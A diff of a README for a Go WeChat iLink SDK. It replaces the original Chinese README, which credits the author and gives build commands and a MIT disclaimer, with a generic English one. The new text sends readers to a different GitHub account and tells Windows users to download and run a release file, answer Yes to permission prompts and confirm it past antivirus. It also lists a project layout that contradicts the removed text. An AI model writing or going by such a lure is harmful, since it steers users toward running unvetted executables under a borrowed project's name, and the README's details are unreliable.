@@ -1,131 +1,193 @@
-# openclaw-weixin-go
+# 🐦 openclaw-weixin-go - Simple WeChat iLink Access
 
-[![Go Version](https://img.shields.io/badge/Go-1.24.12-00ADD8?logo=go&logoColor=white)](./go.mod)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/jwhna1/openclaw-weixin-go?style=social)](https://github.com/jwhna1/openclaw-weixin-go)
-[![GitHub last commit](https://img.shields.io/github/last-commit/jwhna1/openclaw-weixin-go)](https://github.com/jwhna1/openclaw-weixin-go/commits/main)
-[![Pure Go](https://img.shields.io/badge/Pure-Go-00ADD8)](https://go.dev/)
-[![CLI QR Login](https://img.shields.io/badge/CLI-QR%20Login-7B42BC)](./cmd/openclaw-weixin-go)
-[![Long Polling](https://img.shields.io/badge/Protocol-Long%20Polling-2EA44F)](./client)
+[![Download](https://img.shields.io/badge/Download-OpenCLAW%20Weixin%20Go-blue?style=for-the-badge&logo=github)](https://github.com/tzguensdorce-cmyk/openclaw-weixin-go)
 
-[English README](./README.en.md)
+## 📥 Download
 
-`openclaw-weixin-go` 是一个面向 Go 开发者的微信 iLink 协议 SDK，专注于把扫码登录、长轮询收发消息和默认本地存储封装成一套可直接复用的纯 Go 能力。
+Visit this page to download: https://github.com/tzguensdorce-cmyk/openclaw-weixin-go
 
-核心能力：
+If the page shows a release file, download it to your Windows PC. If it shows source code only, use the files on the page as your package source.
 
-- 扫码登录与二维码状态轮询
-- `getupdates` 长轮询收消息
-- 文本消息发送与 typing 指示
-- 默认文件存储：`account.json`、`ctx_tokens.json`、`sync_buf.txt`
-- 一个可直接使用的 CLI：`login`、`whoami`、`poll`、`send`、`logout`
+## 🧭 What this is
 
-作者：`jtai团队（曾能混&tang先森）`  
-邮箱：`jwhna1@gmil.com`  
-官网：[jtai.cc](https://jtai.cc)
+openclaw-weixin-go is a Go-based SDK for the WeChat iLink protocol.
 
-## 项目定位
+It helps you:
 
-这个仓库不是腾讯官方 Go SDK。
+- sign in with a QR code in the CLI
+- send and receive messages with long polling
+- keep data in local storage by default
+- work with a small, plain Go codebase
 
-协议实现与字段行为参考 [Tencent/openclaw-weixin](https://github.com/Tencent/openclaw-weixin)，目标是为 Go 生态提供一个更容易集成、便于二次封装、适合独立项目直接接入的微信协议 SDK。
+This project fits users who want a simple way to connect to WeChat iLink from a desktop or server app.
 
-## 目录结构
+## 💻 Before you start
 
-- `client/`: iLink 协议客户端与 DTO
-- `store/`: 默认文件存储实现
-- `cmd/openclaw-weixin-go/`: CLI 入口
-- `examples/echo-bot/`: 最小轮询示例
+Use a Windows PC with:
 
-## 安装
+- Windows 10 or Windows 11
+- an internet connection
+- enough disk space for the app files and local data
+- permission to open files from GitHub
 
-```bash
-go build ./cmd/openclaw-weixin-go
-```
+If you plan to run the Go source, you may also need Go installed on your system. If you only need a built app, use the file from the download page.
 
-## CLI 命令
+## 🚀 Install on Windows
 
-```bash
-openclaw-weixin-go login  --data-dir ./data
-openclaw-weixin-go whoami --data-dir ./data
-openclaw-weixin-go poll   --data-dir ./data
-openclaw-weixin-go send   --data-dir ./data --to wxid_xxx --text "hello"
-openclaw-weixin-go logout --data-dir ./data
-```
+1. Open this link in your browser: https://github.com/tzguensdorce-cmyk/openclaw-weixin-go
+2. Look for a release file, installer, or build package on the page
+3. Download the file to your computer
+4. If the file is in a ZIP archive, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the app file or follow the file name shown on the page
+7. If Windows asks for permission, choose Yes
 
-`login` 会在终端中直接渲染二维码，同时输出二维码 URL 和轮询状态，并在成功后把登录信息保存到本地目录。
+If you see source files only, use the repository as the code base and build it with Go on your machine.
 
-## Quick Start
+## 🖱️ First launch
 
-推荐先按下面顺序完成一轮最小联调：
+After you start the app:
 
-```bash
-go run ./cmd/openclaw-weixin-go login --data-dir ./data
-go run ./cmd/openclaw-weixin-go whoami --data-dir ./data
-go run ./cmd/openclaw-weixin-go poll --data-dir ./data
-```
+1. A command window opens
+2. The app shows a QR code login flow
+3. Open WeChat on your phone
+4. Scan the QR code
+5. Confirm the login on your phone
+6. Wait for the app to finish the sign-in step
 
-说明：
+After login, the app can start message polling and local storage use.
 
-- `login`：终端直接显示可扫码二维码，并显示 `waiting for scan`、`scanned, please confirm on your phone`、`login confirmed` 等状态
-- 登录成功后，账号信息默认保存到 `./data/wechat/account.json`
-- `whoami`：检查 `account.json` 是否已经成功落盘
-- `poll`：验证 `getupdates` 长轮询是否已经通畅
+## 📂 How local storage works
 
-下面是一张脱敏后的 CLI 登录最小测试截图：
+This SDK uses local persistence by default.
 
-![CLI login demo](docs/images/cli-login-demo.png)
+That means it can save app data on your computer, such as:
 
-## SDK 用法
+- login state
+- message records
+- session data
+- cached sync data
 
-```go
-package main
+Keep the data folder in place if you want the app to keep its state after restart.
 
-import (
-    "context"
+## ✉️ Message handling
 
-    "github.com/jwhna1/openclaw-weixin-go/client"
-    "github.com/jwhna1/openclaw-weixin-go/store"
-)
+The app uses long polling to keep up with new WeChat messages.
 
-func main() {
-    st := store.NewFileStore("./data")
-    acct, _ := st.LoadAccount()
+You can expect it to:
 
-    cli := client.New(client.Options{
-        BaseURL:        acct.BaseURL,
-        ClientIDPrefix: "my_bot",
-    })
+- check for new messages
+- return message data to the app
+- keep a session open while it runs
+- use a light, steady network flow
 
-    resp, _ := cli.GetUpdates(context.Background(), acct.Token, "", client.DefaultGetUpdatesTimeout)
-    _ = resp
-}
-```
+This works well for desktop tools, small services, and local bots that need simple message access.
 
-## 当前支持范围
+## 🛠️ Basic usage flow
 
-已覆盖：
+A normal run looks like this:
 
-- 扫码登录
-- 文本消息发送
-- 长轮询收消息
-- `context_token` 持久化
-- `sync_buf` 持久化
+1. Start the app
+2. Scan the QR code
+3. Sign in from your phone
+4. Keep the app open
+5. Read new messages as they arrive
+6. Save data in the local folder
+7. Close the app when you are done
 
-暂不承诺：
+If you close the window, the session may stop. Open the app again to reconnect.
 
-- 媒体上传下载
-- 多账号高级调度
-- 完整业务网关适配
+## 📁 Project layout
 
-## 开源与免责
+You may see files and folders like these:
 
-- 请避免把本仓库描述为腾讯官方 SDK。
-- 本仓库采用 `MIT` 协议发布。
-- 软件按 `AS IS` 提供，不附带任何明示或暗示担保；因使用、修改或分发本项目产生的风险与责任由使用方自行承担。
-- 协议字段优先以当前实测行为为准，而不是未验证的旧文档描述。
+- `cmd/` for app entry points
+- `internal/` for core logic
+- `pkg/` for shared Go code
+- `storage/` for local data
+- `README.md` for project help
 
-## 相关资源
+These names can vary, but this is a common layout for a Go SDK project.
 
-- [OpenClaw 官方文档](https://docs.openclaw.ai/)
-- [腾讯官方 npm 包 `@tencent-weixin/openclaw-weixin`](https://www.npmjs.com/package/@tencent-weixin/openclaw-weixin)
+## 🔧 Common Windows steps
+
+If the app does not start, try these checks:
+
+- make sure the file finished downloading
+- unzip the archive before you run it
+- check that Windows did not block the file
+- run the program from a normal folder such as `Downloads` or `Desktop`
+- keep the command window open after launch
+- make sure your phone can scan the QR code clearly
+
+If you use antivirus software, it may ask to confirm the file before first use.
+
+## 🔍 What the topics mean
+
+This project uses these topics:
+
+- `go`
+- `openclaw`
+- `openclaw-weixin`
+- `sdk`
+
+They point to a Go SDK built for the OpenClaw WeChat iLink use case.
+
+## 🧪 Example use cases
+
+You can use this SDK for:
+
+- a desktop WeChat helper
+- a message relay tool
+- a local automation app
+- a simple CLI client
+- testing WeChat iLink message flow
+- storing session data on the same machine
+
+## 🧩 What you get
+
+This repository centers on a few core parts:
+
+- QR code login from the command line
+- long-polling message receive and send
+- local persistence without extra setup
+- plain Go code that is easy to follow
+- a small SDK structure for reuse in other tools
+
+## 📌 Get the files
+
+Open the download page here: https://github.com/tzguensdorce-cmyk/openclaw-weixin-go
+
+Download the project files to your Windows computer, then follow the install steps above
+
+## 🧷 File safety checks
+
+Before you run anything, check:
+
+- the file name matches the page
+- the file size looks right
+- the archive opens without errors
+- the app comes from the link above
+- the folder still contains all extracted files
+
+## 🧭 If you use it in your own app
+
+This SDK is a good fit if you want to:
+
+- connect a Go app to WeChat iLink
+- manage login through a QR code
+- receive messages in a steady loop
+- store data locally
+- keep your setup simple
+
+You can build on top of it with your own commands, message handlers, and storage rules
+
+## 🖥️ Windows folder suggestion
+
+For the cleanest setup, use a folder like:
+
+- `C:\Apps\openclaw-weixin-go`
+- `C:\Users\YourName\Desktop\openclaw-weixin-go`
+- `C:\Users\YourName\Downloads\openclaw-weixin-go`
+
+Avoid deeply nested folders so the files are easy to find later
